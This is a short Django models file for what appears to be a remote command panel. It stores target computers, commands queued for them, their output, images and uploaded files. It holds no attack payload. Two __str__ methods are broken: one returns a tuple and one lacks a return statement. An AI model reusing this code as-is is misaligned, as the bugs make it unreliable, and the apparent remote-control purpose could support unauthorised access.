from django.db import models


class Computer(models.Model):
    ip_addr = models.CharField(default="192.168.1.1",max_length=50)
    pc_name = models.CharField(default="", max_length=100)
    last_online = models.DateTimeField()

    def __str__(self):
        return self.pc_name, self.ip_addr

class Command(models.Model):
    command = models.TextField(default="", max_length=2000)
    target = models.ForeignKey(Computer, on_delete=models.CASCADE)

    def __str__(self):
        f"{self.command} {self.target}"

class Output(models.Model):
    command = models.CharField(default="", max_length=2000)
    output = models.TextField(default="", max_length=2000)
    target = models.ForeignKey(Computer, on_delete=models.CASCADE)
    time = models.DateTimeField()

class Image(models.Model):
    img_data = models.TextField(default="")
    img_name = models.CharField(max_length=200, default="")

class Files(models.Model):
    file = models.FileField(upload_to="files")

    